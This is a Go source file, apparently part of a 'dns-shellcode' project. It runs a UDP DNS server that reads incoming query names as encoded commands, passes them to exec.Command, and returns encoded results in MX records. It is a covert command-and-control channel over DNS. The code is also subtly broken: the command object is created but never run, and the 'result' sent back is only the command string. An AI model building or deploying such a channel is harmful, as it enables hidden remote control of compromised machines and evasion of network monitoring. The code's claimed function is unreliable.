package main

import "C"
import (
	"dns-shellcode/encoder"
	"fmt"
	"github.com/miekg/dns"
	"os/exec"
)

type dnsHandler struct{}

func main() {
	handler := new(dnsHandler)
	server := &dns.Server{
		Addr:      ":8090",
		Net:       "udp",
		Handler:   handler,
		UDPSize:   65535,
		ReusePort: true,
	}

	fmt.Println("Starting DNS server on port 8090")
	err := server.ListenAndServe()
	if err != nil {
		fmt.Printf("Failed to start server: %s\n", err.Error())
	}
}

func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true

	for _, question := range r.Question {
		command := encoder.Decode(question.Name)
		fmt.Printf("Received command: %s\n", command)
		cmd := execCmd(command)
		fmt.Printf("Result: %s", cmd)
		encoded := encoder.Encode(cmd.String())
		rr, _ := dns.NewRR(encoded + " 3600 IN MX 10 example.com")
		msg.Answer = append(msg.Answer, rr)
	}
	w.WriteMsg(msg)
}

func execCmd(command string) *exec.Cmd {
	return exec.Command(command)
}
